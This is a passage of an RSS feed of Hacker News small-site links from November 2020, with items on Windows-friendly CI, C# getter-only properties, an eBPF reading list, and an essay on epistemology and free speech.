adopt your package?</h2><p id="1114">Think of Windows what you want. I don’t work for Microsoft, and honestly, I don’t really care. But I assume that many coders out there working on great new software, methods, tools, tutorials, etc. actually want that people become happy users (paid by eternal gratitude). And that is a good enough reason to think about those Windows users as well.</p><ul><li id="10e8">Consider setting up your next continuous integration for your software package, so that it runs on all systems and will be used by more people.<br>For instance with <a href="https://docs.github.com/en/free-pro-team@latest/actions/guides/about-continuous-integration" rel="noopener">continuous integration using GitHub</a> actions it can be as simple as adding a <code>‘windows-latest’</code> to your matrix:<br><code>os: [‘ubuntu-latest’, ‘macos-latest’, ‘windows-latest’]<br></code>(small warning: adding different operating systems to such a continuous integration workflow is comparably easy, the later debugging sometimes is not. One option can be to work with <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/" rel="noopener">Windows virtual machine</a>).</li><li id="906a">What about providing installation instructions for Windows users as well? Or did you just write a new tutorial? Great! But will it work for your fellow Windows users? You would be surprised how many packages and tutorials come with instructions that clearly won’t work for a Windows user. <br>Don’t know how to do that? No Problem! Just ask a Windows user to help you. Believe me, they will be very glad to assist.</li></ul><h2 id="3a14">Final symmetry</h2><p id="9879">Most of my arguments will hold when we just swap the named OS. So, obviously if you are (like me) primarily a Windows user: Think of all those Linux and mac-OS people out there. Either way, it will require learning a bit about the differences. But it will help to avoid a lot of frustration on all ends due to failing notebooks or hard to install packages.</p><h2 id="e34f">Get in touch</h2><p id="38ab">If you have comments or questions please get in touch! You can also find me on twitter: <a href="https://twitter.com/me_datapoint" rel="noopener"><strong>me_datapoint</strong></a></p></div></div></div>]]>
            </description>
            <link>https://blog.esciencecenter.nl/being-a-minority-in-fancy-coding-land-a-windows-user-d853d80a6ef9</link>
            <guid isPermaLink="false">hacker-news-small-sites-25056380</guid>
            <pubDate>Wed, 11 Nov 2020 07:56:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Back to C# basics: Difference between “=” and “{ get; } =” for properties]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25056344">thread link</a>) | @cincura_net
<br/>
November 10, 2020 | https://www.tabsoverspaces.com/id/233844 | <a href="https://web.archive.org/web/*/https://www.tabsoverspaces.com/id/233844">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	<h3>Back to C# basics: Difference between "=&gt;" and "{ get; } =" for properties <a href="https://www.tabsoverspaces.com/id/233844" rel="bookmark nofollow" title="Permalink"><span aria-label="Permalink"></span></a></h3>
	<p>
	<span aria-label="Published"></span> 11 Nov 2020
	<span></span>
	<span aria-label="Time to read"></span> 1 mins
	<span></span>
	<span aria-label="Tags"></span> .NET
</p>
<p>I recently realized, the difference between <code>=&gt;</code> and <code>{ get; } =</code> for properties might not be as known as everybody thinks, based on code I saw multiple times.</p>
<!-- excerpt --> 
<p>Here’s an example code.</p>
<pre><code>public class C
{
	public Foo A { get; } = new Foo();
	public Foo B =&gt; new Foo();
}
</code></pre>
<p>Is it the same or is it not? The answer is, it’s not the same. The <code>A</code> property is property with <em>getter</em> only (aka read only or immutable property). When <code>C</code> instance is created a new instance of <code>Foo</code> is assigned to the property and will be returned from now on. The <code>B</code> property defines also only <em>getter</em>, but this time the <em>getter</em> contains the <code>new Foo();</code> as it’s body, aka returning new instance of <code>Foo</code> every time you access <code>B</code>.</p>
<p>Putting it into barebone C#, it would look like this.</p>
<pre><code>public class C
{
	readonly Foo _a = new Foo();
	
	public Foo A
	{
		get { return _a; }
	}

	public Foo B
	{
		get { return new Foo(); }
	}
}
</code></pre>
<p>Makes sense?</p>

</article><article>
	<p>
		<a href="https://www.tabsoverspaces.com/about"><img src="https://www.tabsoverspaces.com/assets/bio_image.png" alt="Profile Picture"></a>
		Jiří Činčura is an independent developer focusing on data and business layers, language constructs, parallelism and databases. Specifically Entity Framework, asynchronous and parallel programming, cloud and Azure. He's Microsoft Most Valuable Professional and you can read his articles, guides, tips and tricks at www.tabsoverspaces.com.
	</p>
</article></div>]]>
            </description>
            <link>https://www.tabsoverspaces.com/id/233844</link>
            <guid isPermaLink="false">hacker-news-small-sites-25056344</guid>
            <pubDate>Wed, 11 Nov 2020 07:47:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cell Signaling Technologies – Detailed 3D model of human cells]]>
            </title>
            <description>
<![CDATA[
Score 163 | Comments 50 (<a href="https://news.ycombinator.com/item?id=25055908">thread link</a>) | @ozten
<br/>
November 10, 2020 | http://www.digizyme.com/cst_landscapes.html | <a href="https://web.archive.org/web/*/http://www.digizyme.com/cst_landscapes.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="u6389-bw">
     <div id="u6389"><!-- column -->
      <div id="u6389_align_to_page">
       <!-- m_editable region-id="editable-static-tag-U6264-BP_infinity" template="cst_landscapes.html" data-type="html" data-ice-options="disableImageResize,link,txtStyleTarget" -->
       <p><span id="u6264">Cell Signaling Technologies</span></p>
       <!-- /m_editable -->
       <!-- m_editable region-id="editable-static-tag-U6399-BP_infinity" template="cst_landscapes.html" data-type="html" data-ice-options="disableImageResize,link,txtStyleTarget" -->
       <p>Molecular Landscapes</p>
       <!-- /m_editable -->
       
       
       
      </div>
     </div>
    </div></div>]]>
            </description>
            <link>http://www.digizyme.com/cst_landscapes.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055908</guid>
            <pubDate>Wed, 11 Nov 2020 06:02:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dive into BPF: a list of reading material]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25055866">thread link</a>) | @moks
<br/>
November 10, 2020 | https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/ | <a href="https://web.archive.org/web/*/https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<ul id="markdown-toc">
  <li><a href="#what-is-bpf" id="markdown-toc-what-is-bpf">What is BPF?</a></li>
  <li><a href="#dive-into-the-bytecode" id="markdown-toc-dive-into-the-bytecode">Dive into the bytecode</a></li>
  <li><a href="#resources" id="markdown-toc-resources">Resources</a>    <ul>
      <li><a href="#generic-presentations" id="markdown-toc-generic-presentations">Generic presentations</a>        <ul>
          <li><a href="#about-bpf" id="markdown-toc-about-bpf">About BPF</a></li>
          <li><a href="#about-xdp" id="markdown-toc-about-xdp">About XDP</a></li>
          <li><a href="#about-other-components-related-or-based-on-ebpf" id="markdown-toc-about-other-components-related-or-based-on-ebpf">About other components related or based on eBPF</a></li>
        </ul>
      </li>
      <li><a href="#documentation" id="markdown-toc-documentation">Documentation</a>        <ul>
          <li><a href="#about-bpf-1" id="markdown-toc-about-bpf-1">About BPF</a></li>
          <li><a href="#about-tc" id="markdown-toc-about-tc">About tc</a></li>
          <li><a href="#about-xdp-1" id="markdown-toc-about-xdp-1">About XDP</a></li>
          <li><a href="#about-flow-dissectors" id="markdown-toc-about-flow-dissectors">About flow dissectors</a></li>
          <li><a href="#about-p4-and-bpf" id="markdown-toc-about-p4-and-bpf">About P4 and BPF</a></li>
        </ul>
      </li>
      <li><a href="#tutorials" id="markdown-toc-tutorials">Tutorials</a></li>
      <li><a href="#examples" id="markdown-toc-examples">Examples</a>        <ul>
          <li><a href="#from-the-kernel" id="markdown-toc-from-the-kernel">From the kernel</a></li>
          <li><a href="#from-package-iproute2" id="markdown-toc-from-package-iproute2">From package iproute2</a></li>
          <li><a href="#from-bcc-set-of-tools" id="markdown-toc-from-bcc-set-of-tools">From bcc set of tools</a></li>
          <li><a href="#other-examples" id="markdown-toc-other-examples">Other examples</a></li>
          <li><a href="#manual-pages" id="markdown-toc-manual-pages">Manual pages</a></li>
        </ul>
      </li>
      <li><a href="#the-code" id="markdown-toc-the-code">The code</a>        <ul>
          <li><a href="#bpf-code-in-the-kernel" id="markdown-toc-bpf-code-in-the-kernel">BPF code in the kernel</a></li>
          <li><a href="#xdp-hooks-code" id="markdown-toc-xdp-hooks-code">XDP hooks code</a></li>
          <li><a href="#bpf-logic-in-bcc" id="markdown-toc-bpf-logic-in-bcc">BPF logic in bcc</a></li>
          <li><a href="#code-to-manage-bpf-with-tc" id="markdown-toc-code-to-manage-bpf-with-tc">Code to manage BPF with tc</a></li>
          <li><a href="#bpf-utilities" id="markdown-toc-bpf-utilities">BPF utilities</a></li>
          <li><a href="#other-interesting-chunks" id="markdown-toc-other-interesting-chunks">Other interesting chunks</a></li>
          <li><a href="#llvm-backend" id="markdown-toc-llvm-backend">LLVM backend</a></li>
          <li><a href="#running-in-userspace" id="markdown-toc-running-in-userspace">Running in userspace</a></li>
          <li><a href="#commit-logs" id="markdown-toc-commit-logs">Commit logs</a></li>
        </ul>
      </li>
      <li><a href="#troubleshooting" id="markdown-toc-troubleshooting">Troubleshooting</a>        <ul>
          <li><a href="#errors-at-compilation-time" id="markdown-toc-errors-at-compilation-time">Errors at compilation time</a></li>
          <li><a href="#errors-at-load-and-run-time" id="markdown-toc-errors-at-load-and-run-time">Errors at load and run time</a></li>
        </ul>
      </li>
      <li><a href="#and-still-more" id="markdown-toc-and-still-more">And still more!</a></li>
    </ul>
  </li>
</ul>

<p><em>~ <a href="https://github.com/qmonnet/whirl-offload/commits/gh-pages/_posts/2016-09-01-dive-into-bpf.md">Updated</a> 2019-01-10 ~</em></p>



<p>BPF, as in <strong>B</strong>erkeley <strong>P</strong>acket <strong>F</strong>ilter, was initially conceived in 1992
so as to provide a way to filter packets and to avoid useless packet copies
from kernel to userspace. It initially consisted in a simple bytecode that is
injected from userspace into the kernel, where it is checked by a verifier—to
prevent kernel crashes or security issues—and attached to a socket, then run on
each received packet. It was ported to Linux a couple of years later, and used
for a small number of applications (tcpdump for example). The simplicity of the
language as well as the existence of an in-kernel Just-In-Time (JIT) compiling
machine for BPF were factors for the excellent performances of this tool.</p>

<p>Then in 2013, Alexei Starovoitov completely reshaped it, started to add new
functionalities and to improve the performances of BPF. This new version is
designated as eBPF (for “extended BPF”), while the former becomes cBPF
(“classic” BPF). New features such as maps and tail calls appeared. The JIT
machines were rewritten. The new language is even closer to native machine
language than cBPF was. And also, new attach points in the kernel have been
created.</p>

<p>Thanks to those new hooks, eBPF programs can be designed for a variety of use
cases, that divide into two fields of applications. One of them is the domain
of kernel tracing and event monitoring. BPF programs can be attached to kprobes
and they compare with other tracing methods, with many advantages (and
sometimes some drawbacks).</p>

<p>The other application domain remains network programming. In addition to socket
filter, eBPF programs can be attached to tc (Linux traffic control tool)
ingress or egress interfaces and perform a variety of packet processing tasks,
in an efficient way. This opens new perspectives in the domain.</p>

<p>And eBPF performances are further leveraged through the technologies developed
for the IO Visor project: new hooks have also been added for XDP (“eXpress Data
Path”), a new fast path recently added to the kernel. XDP works in conjunction
with the Linux stack, and relies on BPF to perform very fast packet processing.</p>

<p>Even some projects such as P4, Open vSwitch,
<a href="http://openvswitch.org/pipermail/ovs-dev/2014-October/047421.html">consider</a>
or started to approach BPF. Some others, such as CETH, Cilium, are entirely
based on it. BPF is buzzing, so we can expect a lot of tools and projects to
orbit around it soon…</p>



<p>As for me: some of my work (including for
<a href="https://qmonnet.github.io/whirl-offload/2016/07/15/beba-research-project/">BEBA</a>)
is closely related to eBPF, and several future articles on this site will focus
on this topic. Logically, I wanted to somehow introduce BPF on this blog before
going down to the details—I mean, a real introduction, more developed on BPF
functionalities that the brief abstract provided in first section: What are BPF
maps? Tail calls? What do the internals look like? And so on. But there are a
lot of presentations on this topic available on the web already, and I do not
wish to create “yet another BPF introduction” that would come as a duplicate of
existing documents.</p>

<p>So instead, here is what we will do. After all, I spent some time reading and
learning about BPF, and while doing so, I gathered a fair amount of material
about BPF: introductions, documentation, but also tutorials or examples. There
is a lot to read, but in order to read it, one has to <em>find</em> it first.
Therefore, as an attempt to help people who wish to learn and use BPF, the
present article introduces a list of resources. These are various kinds of
readings, that hopefully will help you dive into the mechanics of this kernel
bytecode.</p>



<figure>
  <img src="https://qmonnet.github.io/whirl-offload/img/icons/pic.svg">
</figure>

<h2 id="generic-presentations">Generic presentations</h2>

<p>The documents linked below provide a generic overview of BPF, or of some
closely related topics. If you are very new to BPF, you can try picking a
couple of presentation among the first ones and reading the ones you like most.
If you know eBPF already, you probably want to target specific topics instead,
lower down in the list.</p>

<h3 id="about-bpf">About BPF</h3>

<p>Generic presentations about eBPF:</p>

<ul>
  <li>
    <p><a href="https://blogs.igalia.com/dpino/2019/01/07/introduction-to-xdp-and-ebpf/"><em>A brief introduction to XDP and eBPF</em></a>
(Diego Pino García, January 2019): <br>
An excellent and accessible introduction providing context, history, and
details about the functioning of eBPF.</p>
  </li>
  <li>
    <p><a href="https://www.redhat.com/en/blog/introduction-ebpf-red-hat-enterprise-linux-7"><em>Introduction to eBPF in Red Hat Enterprise Linux 7</em></a>
(Stanislav Kozina, January 2019): <br>
Focusing on the eBPF features arriving in Red Hat.</p>
  </li>
  <li>
    <p><a href="http://fulvio.frisso.net/files/18HPSR%20-%20eBPF.pdf"><em>Toward Flexible and Efficient In-Kernel Network Function Chaining with IO Visor</em></a>
(Fulvio Risso, HPSR 2018, Bucharest, June 2018): <br>
A generic introduction to BPF, XDP, IO Visor, bcc and other components.</p>
  </li>
  <li>
    <p><a href="https://lwn.net/Articles/740157/"><em>A thorough introduction to eBPF</em></a>
(Matt Flemming, on LWN.net, December 2017): <br>
A well-written and accessible introduction providing an overview of eBPF
subsystem components.</p>
  </li>
  <li>
    <p><a href="http://schd.ws/hosted_files/ossna2017/da/BPFandXDP.pdf"><em>Making the Kernel’s Networking Data Path Programmable with BPF and XDP</em></a>
(Daniel Borkmann, OSSNA17, Los Angeles, September 2017):<br>
One of the best set of slides available to understand quickly all the basics about eBPF and XDP (mostly for network processing).</p>
  </li>
  <li>
    <p><a href="https://speakerdeck.com/tuxology/the-bsd-packet-filter">The BSD Packet Filter</a>
(Suchakra Sharma, June 2017): <br>
A very nice introduction, mostly about the tracing aspects.</p>
  </li>
  <li>
    <p><a href="http://www.slideshare.net/brendangregg/bpf-tracing-and-more"><em>BPF: tracing and more</em></a>
(Brendan Gregg, January 2017):<br>
Mostly about the tracing use cases.</p>
  </li>
  <li>
    <p><a href="http://www.slideshare.net/brendangregg/linux-bpf-superpowers"><em>Linux BPF Superpowers</em></a>
(Brendan Gregg, March 2016):<br>
With a first part on the use of <strong>flame graphs</strong>.</p>
  </li>
  <li>
    <p><a href="https://www.socallinuxexpo.org/sites/default/files/presentations/Room%20211%20-%20IOVisor%20-%20SCaLE%2014x.pdf"><em>IO Visor</em></a>
(Brenden Blanco, SCaLE 14x, January 2016):<br>
Also introduces <strong>IO Visor project</strong>.</p>
  </li>
  <li>
    <p><a href="https://events.linuxfoundation.org/sites/events/files/slides/ebpf_on_the_mainframe_lcon_2015.pdf"><em>eBPF on the Mainframe</em></a>
(Michael Holzheu, LinuxCon, Dublin, October 2015)</p>
  </li>
  <li>
    <p><a href="https://events.linuxfoundation.org/sites/events/files/slides/tracing-linux-ezannoni-linuxcon-ja-2015_0.pdf"><em>New (and Exciting!) Developments in Linux Tracing</em></a>
(Elena Zannoni, LinuxCon, Japan, 2015)</p>
  </li>
  <li>
    <p><a href="https://events.linuxfoundation.org/sites/events/files/slides/bpf_collabsummit_2015feb20.pdf"><em>BPF — in-kernel virtual machine</em></a>
(Alexei Starovoitov, February 2015):<br>
Presentation by the author of eBPF.</p>
  </li>
  <li>
    <p><a href="https://lwn.net/Articles/603983/"><em>Extending extended BPF</em></a>
(Jonathan Corbet, July 2014)</p>
  </li>
</ul>

<p><strong>BPF internals</strong>:</p>

<ul>
  <li>Daniel Borkmann has been doing an amazing work to present <strong>the internals</strong> of eBPF, in particular about <strong>its use with tc</strong>, through several talks and papers.
    <ul>
      <li><a href="http://netdevconf.org/1.2/session.html?daniel-borkmann"><em>Advanced programmability and recent updates with tc’s cls_bpf</em></a>
(netdev 1.2, Tokyo, October 2016):<br>
Daniel provides details on eBPF, its use for tunneling and encapsulation,
direct packet access, and other features.</li>
      <li><a href="http://netdevconf.org/1.2/slides/oct5/07_tcws_daniel_borkmann_2016_tcws.pdf"><em>cls_bpf/eBPF updates since netdev 1.1</em></a>
(netdev 1.2, Tokyo, October 2016, part of
<a href="http://netdevconf.org/1.2/session.html?jamal-tc-workshop">this tc workshop</a>)</li>
      <li><a href="http://www.netdevconf.org/1.1/proceedings/slides/borkmann-tc-classifier-cls-bpf.pdf"><em>On getting tc classifier fully programmable with cls_bpf</em></a>
(netdev 1.1, Sevilla, February 2016):<br>
After introducing eBPF, this presentation provides insights on many
internal BPF mechanisms (map management, tail calls, verifier). A
must-read! For the most ambitious,
<a href="http://www.netdevconf.org/1.1/proceedings/papers/On-getting-tc-classifier-fully-programmable-with-cls-bpf.pdf">the full paper is available here</a>.</li>
      <li><a href="https://archive.fosdem.org/2016/schedule/event/ebpf/attachments/slides/1159/export/events/attachments/ebpf/slides/1159/ebpf.pdf"><em>Linux tc and eBPF</em></a>
(fosdem16, Brussels, Belgium, January 2016)</li>
      <li><a href="https://fosdem.org/2017/schedule/event/ebpf_xdp/"><em>eBPF and XDP walkthrough and recent updates</em></a>
(fosdem17, Brussels, Belgium, February 2017)</li>
    </ul>

    <p>These presentations are probably one of the best sources of documentation to
understand the design and implementation of internal mechanisms of eBPF.</p>
  </li>
</ul>

<p>The <a href="https://www.iovisor.org/resources/blog"><strong>IO Visor blog</strong></a> has some
interesting technical articles about BPF. Some of them contain a bit of
marketing talks.</p>

<p>As of early 2019, there are more and more presentations being done around
multiple aspects of BPF. One nice example is
<a href="http://vger.kernel.org/lpc-bpf.html">the BPF track</a> that was held in parallel
to the Linux Plumbers Conference in late 2018 (and should be held again on
coming years), where lots of topics related to eBPF development or use cases
were presented.</p>

<p><strong>Kernel tracing</strong>: summing up all existing methods, including BPF:</p>

<ul>
  <li>
    <p><a href="http://www.slideshare.net/vh21/meet-cutebetweenebpfandtracing"><em>Meet-cute between eBPF and Kerne Tracing</em></a>
(Viller Hsiao, July 2016):<br>
Kprobes, uprobes, ftrace</p>
  </li>
  <li>
    <p><a href="http://www.slideshare.net/vh21/linux-kernel-tracing"><em>Linux Kernel Tracing</em></a>
(Viller Hsiao, July 2016):<br>
Systemtap, Kernelshark, trace-cmd, LTTng, perf-tool, ftrace, hist-trigger,
perf, function tracer, tracepoint, kprobe/uprobe…</p>
  </li>
</ul>

<p>Regarding <strong>event tracing and monitoring</strong>, Brendan Gregg uses eBPF a lot and
does an excellent job at documenting some of his use cases. If you are in
kernel tracing, you should see his blog articles related to eBPF or to flame
graphs. Most of it are accessible
<a href="http://www.brendangregg.com/blog/2016-03-05/linux-bpf-superpowers.html">from this article</a>
or by browsing his blog.</p>

<p>Introducing BPF, but also presenting <strong>generic concepts of Linux networking</strong>:</p>

<ul>
  <li>
    <p><a href="http://www.slideshare.net/ThomasGraf5/linux-networking-explained"><em>Linux Networking Explained</em></a>
(Thomas Graf, LinuxCon, Toronto, August 2016)</p>
  </li>
  <li>
    <p><a href="http://www.slideshare.net/ThomasGraf5/linuxcon-2015-linux-kernel-networking-walkthrough"><em>Kernel Networking Walkthrough</em></a>
(Thomas Graf, LinuxCon, Seattle, August 2015)</p>
  </li>
</ul>

<p><strong>Hardware offload</strong>:</p>

<ul>
  <li>eBPF with tc or XDP supports hardware offload, starting with Linux kernel
version 4.9 and introduced by Netronome. Here is a presentation about this
feature:<br>
<a href="http://netdevconf.org/1.2/session.html?jakub-kicinski">eBPF/XDP hardware offload to SmartNICs</a>
(Jakub Kicinski and Nic Viljoen, netdev 1.2, Tokyo, October 2016)</li>
  <li>An updated version was presented on year later:<br>
<a href="https://www.netdevconf.org/2.2/session.html?viljoen-xdpoffload-talk">Comprehensive XDP offload—Handling the edge cases</a>
(Jakub Kicinski and Nic Viljoen, netdev 2.2, Seoul, November 2017)</li>
  <li>I presented a shorter but updated version at FOSDEM 2018:<br>
<a href="https://fosdem.org/2018/schedule/event/xdp/">The Challenges of XDP Hardware Offload</a>
(Quentin Monnet, FOSDEM’18, Brussels, February 2018)</li>
</ul>

<p>About <strong>cBPF</strong>:</p>

<ul>
  <li>
    <p><a href="http://www.tcpdump.org/papers/bpf-usenix93.pdf"><em>The BSD Packet Filter: A New Architecture for User-level Packet Capture</em></a>
(Steven McCanne and Van Jacobson, 1992):<br>
The original paper about (classic) BPF.</p>
  </li>
  <li>
    <p><a href="http://www.gsp.com/cgi-bin/man.cgi?topic=bpf">The FreeBSD manual page about BPF</a>
is a useful resource to understand cBPF programs.</p>
  </li>
  <li>
    <p>Daniel Borkmann realized at least two presentations on cBPF,
<a href="http://borkmann.ch/talks/2013_devconf.pdf">one in 2013 on mmap, BPF and Netsniff-NG</a>, and
<a href="http://borkmann.ch/talks/2014_devconf.pdf">a very complete one in 2014 on tc and cls_bpf</a>.</p>
  </li>
  <li>
    <p>On Cloudflare’s blog, Marek Majkowski presented his
<a href="https://blog.cloudflare.com/introducing-the-bpf-tools/">use of BPF bytecode with the <code>xt_bpf</code> module for <strong>iptables</strong></a>.
It is worth mentioning that eBPF is also supported by this module, starting
with Linux kernel 4.10 (I do not know of …</p></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/">https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/</a></em></p>]]>
            </description>
            <link>https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055866</guid>
            <pubDate>Wed, 11 Nov 2020 05:51:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Personal epistemology, free speech, and tech companies]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25055742">thread link</a>) | @jseliger
<br/>
November 10, 2020 | https://jakeseliger.com/2020/11/10/personal-epistemology-free-speech-and-tech-companies | <a href="https://web.archive.org/web/*/https://jakeseliger.com/2020/11/10/personal-epistemology-free-speech-and-tech-companies">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div>
						<p>The NYT describes “<a href="https://www.nytimes.com/2020/10/13/magazine/free-speech.html">The Problem of Free Speech in an Age of Disinformation</a>, and in response Hacker News commenter <a href="https://news.ycombinator.com/item?id=24813749">throwaway13337</a> says, in part, “It’s not unchecked free speech. Instead, it’s unchecked curation by media and social media companies with the goal of engagement.” There’s some truth to the idea that social media companies have evolved to seek engagement, rather than truth, but I think the social media companies are reflecting a deeper human tendency. I wrote back to throwaway13337: “Try teaching non-elite undergrads, and particularly assignments that require some sense of epistemology, and you’ll discover that the vast majority of people have pretty poor personal epistemic hygiene—it’s not much required in most people, most of the time, in most jobs.”</p>
<p>From what I can tell, we evolved to form tribes, not to be “right:” Jonathan’s Haidt’s <a href="https://jakeseliger.com/2012/03/25/jonathan-haidts-the-righteous-mind-and-what-were-really-arguing-about/"><em>The Righteous Mind: Why Good People Are Divided by Politics and Religion</em></a> deals with this topic well and at length, and I’ve not seen any substantial rebuttals of it. We don’t naturally take to tracking the question, “How do I know what I know?” Instead, we naturally seem to want to find “facts” or ideas that support our preexisting views. In the HN comment thread, someone asked for specific examples of poor undergrad epistemic hygiene, and while I’d prefer not to get super specific for reasons of privacy, I’ve had many conversations that take the following form: “How do you know article x is accurate?” “Google told me.” “How does Google work?” “I don’t know.” “What does it take to make a claim on the Internet.” “Um. A phone, I guess?” A lot of people—maybe most—will uncritically take as fact whatever happens to be served up by Google (it’s always Google and never Duck Duck Go or Bing), and most undergrads whose work I’ve read will, again uncritically, accept clickbait sites and similar as accurate. Part of the reason for this reasoning is that undergrads’s lives are minimally affected by being wrong or incomplete about some claim done in a short assignment that’s being imposed by some annoying professor toff standing between them and their degree.</p>
<p>The gap between elite information discourse and everyday information discourse, even among college students, who may be more sophisticated than their peer equivalents, is vast—so vast that I don’t think most journalists (who mostly talk to other journalists and to experts) and to other people who work with information, data, and ideas really truly understand it. We’re all living in bubbles. I don’t think I did, either, before I saw the epistemic hygiene most undergrads practice, or don’t practice. This is not a “kids these days” rant, either: many of them have never really been taught to ask themselves, “How do I know what I know?” Many have never really learned anything about the scientific method. It’s not happening much in most non-elite schools, so where are they going to get epistemic hygiene from?</p>
<p>The United States alone has 320 million people in it. Table DP02 in the Census at data.census.gov estimates that 20.3% of the population age 25 and older has a college bachelor’s degree, and 12.8% have a graduate or professional degree. Before someone objects, let me admit that a college degree is far from a perfect proxy for epistemic hygiene or general knowledge, and some high school dropouts perform much better at cognition, meta cognition, statistical reasoning, and so forth, than do some people with graduate degrees. With that said, though, a college degree is probably a decent approximation for baseline abstract reasoning skills and epistemic hygiene.</p>
<p>Almost anyone who wants a megaphone in the form of one of the many social media platforms available now has one. The number of people motivated by questions like “What is really true, and how do I discern what is really true? How do I enable myself to get countervailing data and information into my view, or worldview, or worldviews?” is not zero, again obviously, but it’s not a huge part of the population. And many very “smart” people in an IQ sense use their intelligence to build better rationalizations, rather than to seek truth (and I may be among the rationalizers: I’m not trying to exclude myself from that category).</p>
<p>Until relatively recently, almost everyone with a media megaphone had some kind of training or interest in epistemology, even they didn’t call it “epistemology.” Editors would ask, “How do you know that?” or “Who told you that?” or that sort of thing. Professors have systems that are supposed to encourage greater-than-average epistemic hygiene (again: these systems were not and are not perfect, and nothing I have written so far implies that they were or are).</p>
<p>Most people don’t care about the question, “How do you know what you know?” and they’ll be fairly surprised if it’s asked, implicitly or explicitly. Some people are intrigued by it but most aren’t, and view questions about sources and knowledge to be a hindrance. This is less likely to be true of people who aspire to be researchers or work in other knowledge-related professions, but that describes only a small percentage of undergraduates, particularly at non-elite schools. And the “elite schools” thing drives a lot of the media discourse around education. One of the things I like about Professor X’s book <a href="https://jakeseliger.com/2011/06/10/summary-judgement-in-the-basement-of-the-ivory-tower-confessions-of-an-accidental-academic-professor-x/"><em>In the Basement of the Ivory Tower</em></a> is how it functions as a corrective to that discourse.</p>
<p>For most people, floating a factually incorrect conspiracy theory online isn’t going to negatively affect their lives. If someone is a nurse and gives a patient a wrong medication or incorrect medication, that person is not going to be a nurse for long. If the nurse states or repeats a factually incorrect political or social idea online, particularly but not exclusively under a pseudonym, that nurse’s life likely won’t be affected. There’s no truth feedback loop. The same is true for someone working in, say, construction, or engineering, or many other fields. The person is free to state things that are factually incorrect, or incomplete, or misleading, and doing so isn’t going to have many negative consequences. Maybe it will have some positive consequences: one way to show that you’re really on team x is to state or repeat falsehoods that show you’re on team x, rather than on team “What is really true?”</p>
<p>I don’t want to get into daily political discourse, since that tends to raise defenses and elicit anger, but the last eight months have demonstrated many people’s problems with epistemology, and in a way that can have immediate, negative personal consequences—but not for everyone.</p>
<p><a href="https://www.pewresearch.org/fact-tank/2019/09/26/who-doesnt-read-books-in-america/">Pew Research data indicate that a quarter of US adults didn’t read a book in 2018</a>; this is consistent with <a href="https://www.newyorker.com/magazine/2007/12/24/twilight-of-the-books">other data</a> indicating that about half of US adults read zero or one books per year. Again, yes, there are surely many individuals who read other materials and have excellent epistemic hygiene, but this is a reasonable mass proxy, given the demands that reading makes on us.</p>
<p>Many people driving the (relatively) elite discourse don’t realize how many people are not only not like them, but wildly not like them, along numerous metrics. It may also be that <a href="http://www.arnoldkling.com/blog/gossip-at-scale/">we don’t know how to deal with gossip at scale</a>. Interpersonal gossip is all about personal stories, while many problems at scale are best understood through data—but the number of people deeply interested in data and data’s veracity is small. And elite discourse has some of its own possible epistemic falsehoods, or at least uncertainties, embedded within it: some of the populist rhetoric against elites is rooted in truth.</p>
<p>We are all caught in our bubble, and the universe of people is almost unimaginably larger than the number of people in our bubble. If you got this far, you’re probably in a nerd bubble: usually, anything involving the word “epistemology” sends people to sleep or, alternately, scurrying for something like “You won’t believe what this celebrity wore/said/did” instead. Almost no one wants to consider epistemology; to do so as a hobby is rare. One person’s disinformation is another person’s teambuilding. If you think the preceding sentence is in favor of disinformation, by the way, it’s not.</p>
					</div><!-- .entry-content -->
	</div></div>]]>
            </description>
            <link>https://jakeseliger.com/2020/11/10/personal-epistemology-free-speech-and-tech-companies</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055742</guid>
            <pubDate>Wed, 11 Nov 2020 05:28:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Foundation for securing communications plane of CPS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25055601">thread link</a>) | @takko_the_boss
<br/>
November 10, 2020 | https://mikecurnow.com/csis_introduction/ | <a href="https://web.archive.org/web/*/https://mikecurnow.com/csis_introduction/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://mikecurnow.com/csis_introduction/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055601</guid>
            <pubDate>Wed, 11 Nov 2020 04:53:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Business ideas (from my first million podcast)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25055308">thread link</a>) | @micropoet
<br/>
November 10, 2020 | https://www.notion.so/50-Businesses-from-My-First-Million-306d9b5cbaef488ea8181e2d27e71553 | <a href="https://web.archive.org/web/*/https://www.notion.so/50-Businesses-from-My-First-Million-306d9b5cbaef488ea8181e2d27e71553">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/50-Businesses-from-My-First-Million-306d9b5cbaef488ea8181e2d27e71553</link>
